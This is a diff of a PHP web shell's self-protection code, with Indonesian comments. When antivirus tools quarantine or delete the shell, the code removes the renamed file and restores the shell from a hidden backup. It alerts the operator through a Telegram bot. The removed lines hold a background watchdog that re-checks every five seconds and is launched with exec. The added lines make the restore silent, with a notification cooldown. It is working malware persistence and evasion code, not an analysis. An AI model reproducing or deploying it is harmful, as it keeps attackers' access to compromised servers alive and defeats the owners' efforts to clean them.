@@ -267,7 +267,7 @@ if (!@is_file($__wd_file)) {
 # ============================================
 
 
-// Deteksi shell dihapus / di-rename (.VIRUS, .suspected, dll) -> auto-restore + notify
+// Deteksi shell dihapus / di-rename (.VIRUS, .suspected, dll) -> auto-restore (silent, no spam)
 function gecko_check_shell_alive() {
     $shell_file = __FILE__;
     $shell_dir = dirname($shell_file);
@@ -277,106 +277,27 @@ function gecko_check_shell_alive() {
     $backup_name = '.sess_' . md5($shell_file) . '.php';
     $backup_path = $hidden . '/' . $backup_name;
 
-    // Deteksi file yang di-rename oleh AV (Imunify360, ClamAV, dll)
+    // Deteksi file yang di-rename oleh AV
     $av_suffixes = ['.VIRUS', '.suspected', '.quarantine', '.infected', '.bak.bak', '.malware'];
     foreach ($av_suffixes as $suffix) {
         $renamed_file = $shell_file . $suffix;
         if (@is_file($renamed_file)) {
-            // Hapus file yang di-rename AV
             @chmod($renamed_file, 0644);
             @unlink($renamed_file);
-            // Restore shell dari backup
-            if (@is_file($backup_path)) {
-                @copy($backup_path, $shell_file);
-                @chmod($shell_file, 0644);
-                gecko_tg_notify("\xF0\x9F\x9B\xA1 <b>AV DETECTED & BYPASSED!</b>\n\nAntivirus rename shell jadi <code>" . $shell_name . $suffix . "</code>\n\n\xE2\x9C\x85 File .VIRUS <b>dihapus</b>\n\xF0\x9F\x94\x84 Shell <b>di-restore</b> dari backup\n\xF0\x9F\x93\x81 <b>Backup:</b> <code>{$backup_path}</code>" . gecko_tg_info());
-            }
         }
     }
 
-    // Deteksi shell dihapus total
+    // Restore kalau dihapus (silent — notify hanya 1x via cooldown file)
     if (!@is_file($shell_file) && @is_file($backup_path)) {
         @copy($backup_path, $shell_file);
         @chmod($shell_file, 0644);
-        gecko_tg_notify("\xE2\x9A\xA0\xEF\xB8\x8F <b>SHELL DIHAPUS!</b>\n\nShell telah dihapus tapi <b>otomatis di-restore</b> dari backup.\n\xF0\x9F\x93\x81 <b>Backup:</b> {$backup_path}\n\xF0\x9F\x94\x84 <b>Restored to:</b> {$shell_file}" . gecko_tg_info());
-    }
-
-    // Deploy background watchdog (cek terus menerus)
-    gecko_deploy_watchdog($shell_file, $backup_path, $hidden);
-}
-
-function gecko_deploy_watchdog($shell_file, $backup_path, $hidden) {
-    $watchdog_path = $hidden . '/.wd_' . md5($shell_file) . '.php';
-    $pid_file = $hidden . '/.wd_' . md5($shell_file) . '.pid';
-    $shell_name = basename($shell_file);
-
-    // Cek apakah watchdog sudah running
-    if (@is_file($pid_file)) {
-        $pid = @trim(file_get_contents($pid_file));
-        if ($pid && @is_dir("/proc/{$pid}")) {
-            return; // Sudah jalan, skip
+        // Notify hanya kalau belum pernah notify dalam 5 menit terakhir
+        $cooldown_file = $hidden . '/.notify_cooldown';
+        $last = @filemtime($cooldown_file);
+        if (!$last || (time() - $last) > 300) {
+            @touch($cooldown_file);
+            gecko_tg_notify("\xE2\x9A\xA0\xEF\xB8\x8F <b>SHELL RESTORED!</b>\n\nShell dihapus/rename, otomatis di-restore.\n\xF0\x9F\x93\x81 <b>Backup:</b> <code>{$backup_path}</code>" . gecko_tg_info());
         }
-    }
-
-    // Buat watchdog script
-    $tg_bot = $GLOBALS['_tg_bot'];
-    $tg_id = $GLOBALS['_tg_id'];
-    $watchdog_code = '<?php
-@ini_set("max_execution_time", 0);
-@set_time_limit(0);
-@ignore_user_abort(true);
-file_put_contents("' . $pid_file . '", getmypid());
-
-$shell = "' . addslashes($shell_file) . '";
-$backup = "' . addslashes($backup_path) . '";
-$bot = "' . addslashes($tg_bot) . '";
-$chat = "' . addslashes($tg_id) . '";
-$suffixes = [".VIRUS", ".suspected", ".quarantine", ".infected", ".bak.bak", ".malware"];
-
-function wd_notify($msg, $bot, $chat) {
-    $url = "https://api.telegram.org/bot" . $bot . "/sendMessage";
-    $d = ["chat_id" => $chat, "text" => $msg, "parse_mode" => "HTML", "disable_web_page_preview" => true];
-    if (function_exists("curl_init")) {
-        $ch = @curl_init(); @curl_setopt($ch, CURLOPT_URL, $url); @curl_setopt($ch, CURLOPT_POST, true);
-        @curl_setopt($ch, CURLOPT_POSTFIELDS, $d); @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); @curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-        @curl_exec($ch); @curl_close($ch);
-    } else {
-        $o = ["http" => ["method" => "POST", "header" => "Content-Type: application/x-www-form-urlencoded", "content" => http_build_query($d), "timeout" => 5], "ssl" => ["verify_peer" => false, "verify_peer_name" => false]];
-        @file_get_contents($url, false, stream_context_create($o));
-    }
-}
-
-while (true) {
-    // Cek rename oleh AV
-    foreach ($suffixes as $sfx) {
-        $vf = $shell . $sfx;
-        if (@is_file($vf)) {
-            @chmod($vf, 0644);
-            @unlink($vf);
-            if (@is_file($backup)) {
-                @copy($backup, $shell);
-                @chmod($shell, 0644);
-            }
-            wd_notify("\xF0\x9F\x9B\xA1 <b>[WATCHDOG] AV BYPASS!</b>\n\nFile di-rename jadi <code>' . $shell_name . '" . $sfx . "</code>\n\xE2\x9C\x85 <b>Dihapus + Restored</b>\n\xF0\x9F\x95\x90 " . date("Y-m-d H:i:s"), $bot, $chat);
-        }
-    }
-    // Cek shell dihapus total
-    if (!@is_file($shell) && @is_file($backup)) {
-        @copy($backup, $shell);
-        @chmod($shell, 0644);
-        wd_notify("\xE2\x9A\xA0\xEF\xB8\x8F <b>[WATCHDOG] SHELL RESTORED!</b>\n\nShell dihapus, otomatis di-restore.\n\xF0\x9F\x95\x90 " . date("Y-m-d H:i:s"), $bot, $chat);
-    }
-    sleep(5); // Cek setiap 5 detik
-}
-';
-
-    @file_put_contents($watchdog_path, $watchdog_code);
-    @chmod($watchdog_path, 0644);
-
-    // Jalankan watchdog di background
-    if (!stristr(PHP_OS, 'WIN')) {
-        @exec(PHP_BINARY . ' ' . escapeshellarg($watchdog_path) . ' > /dev/null 2>/dev/null &');
     }
 }
 
